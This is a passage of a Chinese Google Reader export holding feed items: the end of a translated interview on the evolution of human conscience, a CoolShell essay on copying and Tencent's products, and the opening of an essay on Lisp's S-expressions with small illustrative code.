年后的今天，人们对人类道德及良知的起源又有了怎样的理解？</strong></li>\n</ul>\n<p>其实，探讨这一话题的著作为数甚多，但基本都是关于演化设计的争论；这些作品仅仅关注道德的表象，看它如何发挥作用、如何在遗传层面上对个体有益。《道德起源》是第一本以整个道德演化的自然历史为对象写作的书。在什么时候、以怎样的方式发生了演化，并最终将人类引向良知？某种意义上而言，这是一个全新的研究领域。</p>\n<ul>\n<li><strong>您在这一研究中都搜集了哪些资料？</strong></li>\n</ul>\n<p>有人认为，在现代社会，以狩猎和采集为生的人基本没有什么政治权利和地位，已被完全边缘化，因此跟史前社会从事狩猎和采集的人完全不具可比性。我认为这种说法大谬不然。</p>\n<p>从上世纪 70 年代开始，有越来越多的证据表明，更新世晚期发生了气候巨变。因此，在 5 万年前，有很多人也像如今这样被剥夺了大部分的生活空间和资源，当然，跟如今一样，这种剥夺也包括政治原因导致的。但是，凡是气候恶化、资源匮乏，狩猎群体就会为了争夺资源而大打出手。</p>\n<p>我所做的工作，就是审视所有经过研究的采猎社会  <a href=\"http://www.guokr.com/#id12\">[注]</a> 。其中，凡在更新世时期并未出现的对象，我便加以扬弃：马背上的猎人（马是从西班牙人手里得来、已经被驯养了的马） <a href=\"http://www.guokr.com/#id12\">[注]</a> ，做毛皮生意、开始买步枪屠杀带毛皮动物的印第安人 <a href=\"http://www.guokr.com/#id12\">[注]</a> ，还有一些出现于北美大陆西北海岸、等级十分森严的部落。到目前为止，我已精心研究了大约 50 个这类现存的群体，以寻找他们的相通之处。接下来，我把那些共通的行为模式投射回人类步入现代化文明的时期。最多回溯到 4.5 万年前，或者 10 万年前。如果超出这一界限，就会出现问题，因为涉及的智力和文化都完全不同了。</p>\n<ul>\n<li><strong>人类从何时起拥有了良知？</strong></li>\n</ul>\n<p>敲定一个准确的时间可不容易，不过我倒可以略加推测。首先，可以确认的是，人类在 4.5 万年以前就拥有了良知——4.5 万年是一个保守估计，所有考古学家都一致认同，当时人类在文化上已步入现代化 <a href=\"http://www.guokr.com/#id12\">[注]</a> ，而发展出道德与良知应与此同步。然后，如果要进一步回溯的话，我认为，最令人信服的猜想应为人类开始狩猎大型猎物的标志性时期 <a href=\"http://www.guokr.com/#id12\">[注]</a> ，即大约 25 万年以前。</p>\n<ul>\n<li><strong>根据您的理论，人类的良知是如何演化的？</strong></li>\n</ul>\n<p>人类开始猎杀大型有蹄类动物，对狩猎活动投入了大量的精力，因为这是生存的重要部分之一。但我的理论认为，在这样一个狩猎团队中，如果要对肉食公平分配，确保整个团队都能获取营养，就不允许存在高高在上的带头大哥。要在人类这一天生等级观念强的群体中分配肉食，就必须把等级制度踩在脚下，扫地出门。我认为这就是道德演化的过程。</p>\n<p>我的推测是，当古人类开始狩猎大型猎物时 <a href=\"http://www.guokr.com/#id12\">[注]</a> ，就必然开始打击和限制带头大哥。这种做法产生了选择压力，也就是说，如果你无法控制自己出头的倾向，就会被干掉或是赶走，后者跟被干掉也差不多。因此，对于具有繁殖优势的种马型个体，自制就变成了重要特点。而自制又转化为良知。</p>\n<ul>\n<li><strong>人类良知的演化持续了多久？</strong></li>\n</ul>\n<p><a href=\"http://www.guokr.com/article/89430/\">爱德华·威尔逊</a> （Edward O. Wilson）说，一项新的进化特征需要经历上千代才能形成。对人类而言，那大致相当于 2.5 万年。像良知这么复杂的东西，很可能需要更长时间。某些特殊的现象还完全是个谜，例如为什么人一害羞就会脸红。谁都不明白，这到底是怎么演化而成的。不过我认为，这种演化经历了数千代人，也就是大约 2.5 万到 7.5 万年的时间。</p>\n<ul>\n<li><strong>道德还在以怎样的方式持续演化？</strong></li>\n</ul>\n<p>这很难讲。我做几点猜测。史前，精神变态者 <a href=\"http://www.guokr.com/#id12\">[注]</a> 很容易识别和处理，也不得不加以处理，办法就是杀掉。而时至今日，在一个巨大的匿名社会中，许多精神变态者 <a href=\"http://www.guokr.com/#id12\">[注]</a> 似乎不受任何约束，也可以自由繁殖后代。或许，需要在文化层面上采取进一步的道德举措，以应对总人口中精神病发病率的增长。不过这可能是千万年以后的事情了。</p>\n<p>道德的确在文化层面演化着。举例而言，去年，美国媒体突然对校园欺负事件极度关注，这与校方步调一致。较之以前，整个社会正集中大力控制校园欺负行为。而这在远古的狩猎采集者社会也一直是个重大课题。可以说，我们在文化层面上的道德演化忽然又回过头去，关注一个非常古老的问题。</p>\n<div>\n<div><br></div>\n</div>\n<div>\n<div><br></div>\n</div>\n<p><strong>更正说明：</strong>  文中加 <a href=\"http://www.guokr.com/#id12\">[注]</a> 标出内容均为后来更正，具体可以参见 Ent 在回复中给出的解释。此外，原文发布之初所用的 “狩猎采集者社会” 统一更正为 “采猎社会” ，特此说明。（2012-6-14）</p>\n<div>\n<div><br></div>\n</div>\n<table>\n<col>\n<col>\n<tbody valign=\"top\">\n<tr><th>编译说明:</th><td><strong>How Humans Became Moral Beings</strong></td>\n</tr>\n<tr><th>原文信息:</th><td>《史密森尼学会会刊》2012 年 5 月 4 日刊</td>\n</tr>\n<tr><th>文章题图:</th><td>Kyle Smart/kylesmart.co.uk</td>\n</tr>\n<tr><th>内文图片:</th><td>smithsonianmag.com</td>\n</tr>\n</tbody>\n</table>\n<div>\n<div><br></div>\n</div>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td>[注]</td><td><em>(<a href=\"http://www.guokr.com/#id1\">1</a>, <a href=\"http://www.guokr.com/#id2\">2</a>, <a href=\"http://www.guokr.com/#id3\">3</a>, <a href=\"http://www.guokr.com/#id4\">4</a>, <a href=\"http://www.guokr.com/#id5\">5</a>, <a href=\"http://www.guokr.com/#id6\">6</a>, <a href=\"http://www.guokr.com/#id7\">7</a>, <a href=\"http://www.guokr.com/#id9\">8</a>, <a href=\"http://www.guokr.com/#id10\">9</a>, <a href=\"http://www.guokr.com/#id11\">10</a>)</em> 此处已经更改。</td></tr>\n</tbody>\n</table>\n<div>\n<div><br></div>\n</div>\n</div>"
    },
    "author" : "紫霄朱雀",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1339567984683",
    "timestampUsec" : "1339567984683647",
    "id" : "tag:google.com,2005:reader/item/738f41f2263aabe4",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "杂项资源", "Apple", "C2C", "QQ", "腾讯" ],
    "title" : "抄袭，腾讯 和 产品",
    "published" : 1339547731,
    "updated" : 1339547731,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7617.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><img title=\"i hate copycat!\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/i-hate-copycat-296x300.png\" alt=\"\" width=\"296\" height=\"300\">很早就想写这篇文章了，只是想法比较零碎，所以一直没有成文，这两天觉得思考得比较成熟了一些，所以把我的这些想法整理下来，欢迎大家一起和我讨论。</p>\n<h4>鄙视抄袭和山寨</h4>\n<p>首先，先表达我的立场，我对抄袭的立场持BS和痛恨的态度，尤其是<a title=\"中国的C2C模式\" href=\"http://coolshell.cn/articles/3820.html\">那些C2C的网站</a>，痛恨这些国外有什么就山寨什么的做法，尤其是那些连界面都不改，像素级的抄袭，连CSS和img都是一样的，更甚者，连图片都链接到抄袭源的网站去了，连源代码都抄的行为，比如：<a href=\"http://weibo.com/1661751144/yjLfJqMZ6\">腾讯抄新浪的代码</a>，<a href=\"http://yuanxing.iteye.com/blog/638129\">新浪抄twitter的源码</a>。无法不BS之。</p>\n<p>有很多网友邀请我去那个抄袭Quora的网站上去回答问题，借此，再次声明我不会去的。因此，有一些网友说，我不一样也在Twitter的抄袭网站新浪微博上吗？说我装逼了。我想说，新浪和Twitter基本上是同一种产品的思路，但是其实现不一样，新浪微博上一些twitter上没有功能，我个人觉得这并不算抄袭，我甚至认为新浪微博和Twitter各有长处，在一些功能上新浪微博比twitter做得更好。你可以理解为，新浪微博总体上来说并没有突破我心中的那个条抄袭的底线。</p>\n<p>我个人对抄袭的理解如下：</p>\n<p style=\"padding-left:30px\">1）你可以复制别人的想法和功能，但是如果你连界面设计，代码，图片，风格，布局，等等所有的一切都照抄，那我就一定要鄙视你。</p>\n<p style=\"padding-left:30px\">2）你可以仿照别人的产品，但是你的出发点应该是他没做好，我来把它把做好，如果你的出发点是为了复制抄袭和山寨，我一样鄙视。</p>\n<p>所以，你可以理解我为什么不去Quora，Stackoverflow，Facebook，Google的山寨网站了，因为上述两点，1）完全复制，2）山寨地太次。</p>\n<h4>理性对待抄袭</h4>\n<p>因为很多朋友极端地理解了我对抄袭的立场，所以我有必要要说说我对“抄袭”或是“模仿”的其它一些观点：</p>\n<p><span></span></p>\n<p><strong>1）“抄袭想法”</strong>。想法这个东西我不觉是有什么专有的东西，也不存在什么抄袭，好的想法，就不应该被垄断，好的想法是应该放出来让大家一起来实现的。所以，我并不觉得一个想法有什么不能被抄袭的。你做Web Server，我也做Web Server，你做论坛，我也做论坛，你做手机，我也做手机，你做便携电脑，我也做便携电脑，你做通讯软件，我也可以做通讯软件…… 等等，越是优秀的产品和思路，就越不可能不被别人学习和模仿的。</p>\n<p><strong>2）“抄袭界面”</strong>。根据法律来说，界面上的某些元件，如菜单，按钮，甚至布局，配色之类的单一的东西是没有版权的，但是这些东西组成的界面是存在版权的，你不能让你的产品界面和别人的界面长得雷同。而且，对于一些有艺术特征的设计和版式是受法律保护的。所以，对于界面来说，我们需要做一些区别，比如，很多电视机长得很相似，连摇控器都很相似，但是电视其中的菜单和功能会有不同；很多的家用小汽车形状都很相似，但是线条和外形并不相似；Unix和Linux的用户接口几乎一样，但是Unix和Linux的内部实现和功能上有很大的不同（比如文件系统，内核管理等），MacOS/Windows/X-Win/Gnome/KDE 这些桌面系统大同，但是实现和细节上又不一样。</p>\n<p>看我这样一说，你会说，嗯，你说的就是所谓的“微创新”！是的，这是个仁者见仁，智者见智的问题了。再说一遍，无所谓什么微创新不微创新，我对此的价值观很简单  —— <strong>只要你这个复制品在不违反法律的层面上，能在品质上超过原来那个产品，我是会认可的，而且还是会对复制品买帐的</strong>。</p>\n<p>总之，我想说的是——</p>\n<p style=\"padding-left:30px\">1）好的东西总是会让人去学习和仿制的，而学习和仿制好的一面是会引入竞争，竞争会让这个东西更好的。</p>\n<p style=\"padding-left:30px\">2）不要害怕被人仿制，被人仿制说明你做得好，如果你的仿冒者超过了你，那你应该反思自己，而不要赖别人。</p>\n<h4>如何不被腾讯抄袭</h4>\n<p>说起抄袭这个事来，就不得不说腾讯，现在互联网上一堆人都在思考，腾讯太变态，无论我做什么，都逃不出他的魔掌。很多风投都在问创业团队一个问题——“如果腾讯抄你，你怎么办？”。</p>\n<p>在我往下阐述如何不被腾讯抄的话题下，请让我先重申一下我在“<a title=\"腾讯，竞争力 和 用户体验\" href=\"http://coolshell.cn/articles/5901.html\">腾讯，竞争力 和 用户体验</a>”一文中说的那个观点：“<em>腾讯这样大规模的抄袭和山寨，对整个社会的价值就是——会让很多很多的创业团队放弃Copy，甚至让他们要放弃那些容易被复制的“业务型的项目”，而逼着他们去努力思考，如何才不能被腾讯复制，如何才能有自己的核心价值</em>”，我把这个观点再进一步阐述，“<strong>有腾讯在，会让你更清楚地认识什么叫创业的残酷，会让你更清楚认识到什么是真正产品的价值，什么是核心竞争力，你但凡有一点急功近利的想法你都要想一想那个有钱有人有势也很急功近利的企鹅！</strong>”</p>\n<p>我不知道，我写了那篇文章这段时间来，大家有没有思考过前边文章里我说的问题？其实我在“<a title=\"腾讯，竞争力 和 用户体验\" href=\"http://coolshell.cn/articles/5901.html\">腾讯，竞争力 和 用户体验</a>”一文中已经说到过一些了，不知道大家有没有去思考？</p>\n<p>老实说，其实腾讯并不可怕，先让我们来分析一下腾讯的特征和短板：</p>\n<ul>\n<li><strong>特征</strong>。腾讯的很多产品线完全雷同，比如：QQ，微信，空间，群，微博，朋友，等等，几乎完全一样，所以，这是不是说明了下面几个问题：</li>\n</ul>\n<p style=\"padding-left:60px\">1）他们人太多，没事干了，所以什么都干。<br>\n2）各产品线为了规避风险都想伴QQ这个大款，所以不知道怎么创新。<br>\n3）内部竞争激烈，技术团队加班赶工，所以只能无目的地广撒网了。</p>\n<ul>\n<li><strong>短板</strong>。你看看腾讯的这些产品线和他的用户群，我觉得就目前阶段，腾讯至少有三种产品复制不出来。</li>\n</ul>\n<p style=\"padding-left:60px\">1）有烦杂的线下业务的产品。比如：电子商务需要供应商，仓库，物流，等这样物理流程的业务很难复制。<br>\n2）有质量，有价值，有权威的社区。比如，豆瓣，Stackoverflow，Quora这样的有价值的社区。<br>\n3）有技术含量的产品，比如： Nginx，MySQL，Android/iOS 之流技术大于业务的产品。</p>\n<p>通过这样的分析，我想告诉大家，<strong>腾讯并不可怕，可怕的是你自己不会思考和观察，可怕的是你急功近利而没有去找有价值的东西来做</strong>。推而广之，如果你想做的东西是很快就能做出来的，那么你就不要指望不被人抄，也就是说，<strong><span style=\"color:#cc0000\">如果你着眼短期，你无疑会面对众多的抄袭和模仿者让你万劫不复，但是，如果你着眼长期，做一个3-5年需要花费大量精力才会成熟的产品，那么，那些急功近利的抄袭者会知难而退的</span></strong>。因为，“需要3-5年的时间”这一条完全不符合抄袭者的价值观，所以，你面对的竞争对手也会少了9成。</p>\n<h4>什么是真正的产品</h4>\n<p>说到这里，我必需要说一下什么是真正的产品！我看到现在很多创业团队把功能当产品来做，这就为模仿者们留下了很多很多机会，比如苹果商店里的很多照片分享的Apps，或是一些云存读，云分享之类的东西，如：Dropbox和Evernote，或是一些旅游类的Apps。这些东西在我眼里还不能算得上是真正的产品，所以，我们可以看到他们的模仿者有很多很多。当然，我并不是说不能把功能当成产品来做，只是我觉得这样的产品并不长久，并不具强大的可持续性，而且很容易被取代。那怕是现在风头正劲的Instgram, Dropbox, Evernote，大家试想一下，如果哪天Apple或是Canon把Instgram这样的功能集成到他的照相功能中，哪天操作系统把Dropbox/Evernote集成到他的操作系统中。（当然，我只是说有这种可能，我只是想让大家思考一下以功能为产品的弱势是什么样的）</p>\n<p>好，让我来说说什么是真正的产品：</p>\n<ul>\n<li><strong>真正的产品应该是有一个端到端的一个解决方案</strong>。比如说：电子阅读中的从购书，到阅读，再到阅读心得分享，再到推荐，这一整套的解决方案。看看苹果的产品的端到端的解决方案，就知道什么是产品的样子了。</li>\n</ul>\n<ul>\n<li><strong>真正的产品应该是有价值的</strong>。这种价值表现在——你可以从中获得有价值的内容，并且你也可以通过他创造对你有价值的东西。比如，像豆瓣，像Stackoverflow，甚至像Twitter和微博这样让信息平等让信息传递更快的社区，或是像AWS或是Apple的开发平台，等等。可见，我们无法通过QQ获得有价值的东西，我们也无法通过QQ创造有价值的东西。</li>\n</ul>\n<ul>\n<li><strong><strong>真正的产品应该是和社会有交互并能自我进化的</strong>。</strong>真正的产品应该是用户会来贡献有价值的内容，真正的产品应该是有开放的接口让其它系统容易集成的。也就是说，真正的产品应该是有一个生态圈的，在这个生态圈内，不但能自给自足，自我循环，还能自我管理，自我进化。可见，腾讯的用户群完全没有为这个平台贡献什么有价值的东西，更不谈他们会帮腾讯来进化了。</li>\n</ul>\n<ul>\n<li><strong>真正的产品应该是体现品质的</strong>。所谓有品质的意思是，你能从使用这个产品中获得一种感觉，一种档次的提升的感觉。你可以认为使用品牌而非山寨的智能手机，使用一些如Thinkpad或MacBook的笔记本电脑或iPad，因为那是一种品质的体现。但是我们都知道，使用QQ完全没有任何品质的感觉，你不会在你的简历中放上QQ号，你也不会在一些商务场合使用QQ的，不是吗？这就好像请客吃饭一样，你总是会请你的朋友去一些有品质的饭馆而不是拉面馆。</li>\n</ul>\n<p>当你把你的产品目标放在这样高的位置上，你不难发现，一来，仿冒者们无法跟上你的跟步，二来，仿冒者们几乎没有办法来复制。因为，他们只能复制到外表，但永远无法复制到产品的精髓。</p>\n<p>还是那句话，<strong>因为仿冒者们急功近利的基因就决定了他们做不到抄袭。因为QQ用户群的基因也决定了腾讯无法复制豆瓣或Stackoverflow</strong>。</p>\n<p>（全文完）<br>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"腾讯，竞争力 和 用户体验\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F5901.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7617.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">腾讯，竞争力 和 用户体验</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"腾讯帐号申诉的用户体验\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F5966.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7617.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">腾讯帐号申诉的用户体验</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"中国的C2C模式\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3820.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7617.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/06/21/13630825.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">中国的C2C模式</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"C++的坑真的多吗？\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7992.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7617.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2012/08/06/39292329.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">C++的坑真的多吗？</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"恐怖的C++语言\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1724.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7617.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/05/12/8508808.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">恐怖的C++语言</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2011年11月22日 -- <a href=\"http://coolshell.cn/articles/5901.html\" title=\"腾讯，竞争力 和 用户体验\">腾讯，竞争力 和 用户体验</a></li><li>2011年11月28日 -- <a href=\"http://coolshell.cn/articles/5987.html\" title=\"如何设计“找回用户帐号”功能\">如何设计“找回用户帐号”功能</a></li><li>2011年11月25日 -- <a href=\"http://coolshell.cn/articles/5966.html\" title=\"腾讯帐号申诉的用户体验\">腾讯帐号申诉的用户体验</a></li><li>2012年04月27日 -- <a href=\"http://coolshell.cn/articles/7186.html\" title=\"做个环保主义的程序员\">做个环保主义的程序员</a></li><li>2012年03月09日 -- <a href=\"http://coolshell.cn/articles/6775.html\" title=\"Bret Victor – Inventing on Principle\">Bret Victor – Inventing on Principle</a></li><li>2011年08月02日 -- <a href=\"http://coolshell.cn/articles/5089.html\" title=\"10个必需的iOS开发工具和资源\">10个必需的iOS开发工具和资源</a></li><li>2011年03月02日 -- <a href=\"http://coolshell.cn/articles/3820.html\" title=\"中国的C2C模式\">中国的C2C模式</a></li></ul></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1338825124790",
    "timestampUsec" : "1338825124790918",
    "id" : "tag:google.com,2005:reader/item/013a57245d7555d3",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "程序设计", "Lisp", "面向语言编程" ],
    "title" : "Lisp的永恒之道",
    "published" : 1338771526,
    "updated" : 1338771526,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7526.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>【<span style=\"color:#cc0000\">感谢 Todd投递本文 – 微博帐号：</span><a title=\"weidagang\" href=\"http://weibo.com/weidagang\">weidagang</a> 】</p>\n<h4>Lisp之魅</h4>\n<p>长久以来，Lisp一直被许多人视为史上最非凡的编程语言。它不仅在50多年前诞生的时候带来了诸多革命性的创新并极大地影响了后来编程语言的发展，即使在一大批现代语言不断涌现的今天，Lisp的诸多特性仍然未被超越。当各式各样的编程语言摆在面前，我们可以从运行效率、学习曲线、社区活跃度、厂商支持等多种不同的角度进行评判和选择，但我特别看中的一点在于语言能否有效地表达编程者的设计思想。学习C意味着学习如何用过程来表达设计思想，学习Java意味着学习如何用对象来表达设计思想，而虽然Lisp与函数式编程有很大的关系，但学习Lisp绝不仅仅是学习如何用函数表达设计思想。实际上，<strong>函数式编程并非Lisp的本质</strong>，在已经掌握了lambda、高阶函数、闭包、惰性求值等函数式编程概念之后，学习Lisp仍然大大加深了我对编程的理解。<strong>学习Lisp所收获的是如何“自由地”表达你的思想</strong>，这正是Lisp最大的魅力所在，也是这门古老的语言仍然具有很强的生命力的根本原因。</p>\n<h4>Lisp之源</h4>\n<p>Lisp意为表处理(List Processing)，源自设计者John McCarthy于1960年发表的一篇论文《符号表达式的递归函数及其机器计算》。McCarthy在这篇论文中向我们展示了用一种简单的数据结构S表达式(S-expression)来表示代码和数据，并在此基础上构建一种完整的语言。Lisp语言形式简单、内涵深刻，Paul Graham在《Lisp之根源》中将其对编程的贡献与欧几里德对几何的贡献相提并论。</p>\n<h4>Lisp之形</h4>\n<p>然而，与数学世界中简单易懂的欧氏几何形成鲜明对比，程序世界中的Lisp却一直是一种古老而又神秘的存在，真正理解其精妙的人还是少数。从表面上看，Lisp最明显的特征是它“古怪”的S表达式语法。S表达式是一个原子(atom)，或者若干S表达式组成的列表(list)，表达式之间用空格分开，放入一对括号中。“列表“这个术语可能会容易让人联想到数据结构中的链表之类的线形结构，实际上，Lisp的列表是一种可嵌套的树形结构。下面是一些S表达式的例子:</p>\n<pre>\nfoo\n\n()\n\n(a b (c d) e)\n\n(+ (* 2 3) 5)\n\n(defun factorial (N)\n    (if (= N 1)\n        1\n        (* N (factorial (- N 1)))\n    )\n)\n</pre>\n<p><span></span></p>\n<p>据说，这个古怪的S表达式是McCarthy在发明Lisp时候所采用的一种临时语法，他实际上是准备为Lisp加上一种被称为M表达式(M-expression)的语法，然后再把M表达式编译为S表达式。用一个通俗的类比，S表达式相当于是JVM的字节码，而M表达式相当于Java语言，但是后来Lisp的使用者都熟悉并喜欢上了直接用S表达式编写程序，并且他们发现S表达式有许多独特的优点，所以M表达式的引入也就被无限期延迟了。</p>\n<p>许多Lisp的入门文章都比较强调Lisp的函数式特性，而我认为这是一种误导。真正的Lisp之门不在函数式编程，而在S表达式本身，Lisp最大的奥秘就藏在S表达式后面。S表达式是Lisp的语法基础，语法是语义的载体，形式是实质的寄托。<strong>“S表达式”是程序的一种形，正如“七言”是诗的一种形，“微博”是信息的一种形</strong>。正是形的不同，让微博与博客有了质的差异，同样的道理，正是S表达式让Lisp与C、Java、SQL等语言有了天壤之别。</p>\n<h4>Lisp之道</h4>\n<p>一门语言能否有效地表达编程者的设计思想取决于其抽象机制的语义表达能力。根据抽象机制的不同，语言的抽象机制形成了面向过程、面向对象、函数式、并发式等不同的范式。当你采用某一种语言，基本上就表示你已经“面向XXX“了，你的思维方式和解决问题的手段就会依赖于语言所提供的抽象方式。比如，采用Java语言通常意味着采用面向对象分析设计；采用Erlang通常意味着按Actor模型对并发任务进行建模。</p>\n<p>有经验的程序员都知道，无论是面向XXX编程，程序设计都有一条“抽象原则“：What与How解耦。但是，<strong>普通语言的问题就在于表达What的手段非常有限</strong>，无非是过程、类、接口、函数等几种方式，而诸多领域问题是无法直接抽象为函数或接口的。比如，你完全可以在C语言中定义若干函数来做到make file所做的事情，但C代码很难像make file那样声明式地体现出target、depends等语义，它们只会作为实现细节被淹没在一个个的C函数之中。采用OOP或是FP等其它范式也会遇到同样的困难，也就是说make file语言所代表的抽象维度与面向过程、OOP以及FP的抽象维度是正交的，使得各种范式无法直接表达出make file的语义。这就是普通语言的“刚性”特征，它要求我们必须以语言的抽象维度去分析和解决问题，把问题映射到语言的基本语法和语义。</p>\n<p>更进一步，如果仔细探究这种刚性的根源，我们会发现正是由于普通语言<strong>语法和语义的紧耦合</strong>造成了这种刚性。比如，C语言中printf(“hello %s”, name)符合函数调用语法，它表达了函数调用语义，除此之外别无他义；Java中interface IRunnable { … }符合接口定义语法，它表达了接口定义语义，除此之外别无他义。如果你认为“语法和语义紧耦合“是理所当然的，看不出这有什么问题，那么理解Lisp就会让你对此产生更深的认识。</p>\n<p>当你看到Lisp的(f a (b c))的时候，你会想到什么？会不会马上联想到函数求值或是宏扩展？就像在C语言里看到gcd(10, 15)马上想到函数调用，或者在Java里看到class A马上想到类定义一样。如果真是这样，那它就是你理解Lisp的一道障碍，因为你已经习惯了顺着语言去思考，总是在想这一句话机器怎么解释执行？那一句话又对应语言的哪个特性？理解Lisp要反过来，让语言顺着你，Lisp的(f a (b c))可以是任何语义，完全由你来定，它可以是函数定义、类定义、数据库查询、文件依赖关系，异步任务的执行关系，业务规则 …</p>\n<p>下面我准备先通过几个具体的例子逐步展示Lisp的本质。需要说明的是，由于Lisp的S表达式和XML的语法形式都是一种树形结构，在语义表达方面二者并无本质的差别。所以，为了理解方便，下面我暂且用多数人更为熟悉的XML来写代码，请记住我们可以很轻易地把XML代码和Lisp代码相互转换。</p>\n<p>首先，我们可以轻易地用XML来定义一个求两个数最大公约数的函数：</p>\n<pre>\n    &lt;func name=&#39;gcd&#39; return_type=&#39;int&#39;&gt;\n        &lt;params&gt;\n            &lt;a type=&#39;int&#39;/&gt;\n            &lt;b type=&#39;int&#39;/&gt;\n        &lt;/params&gt;\n        &lt;body&gt;\n            &lt;if&gt;\n               &lt;equals&gt;\n                   &lt;a/&gt;\n                   &lt;int&gt;0&lt;/int&gt;\n               &lt;/equals&gt;\n            &lt;/if&gt;\n            &lt;then&gt;\n                &lt;return&gt;&lt;b/&gt;&lt;/return&gt;\n            &lt;/then&gt;\n            &lt;else&gt;\n                &lt;return&gt;\n                    &lt;gcd&gt;\n                        &lt;modulo&gt;&lt;b/&gt;&lt;a/&gt;&lt;/modulo&gt;\n       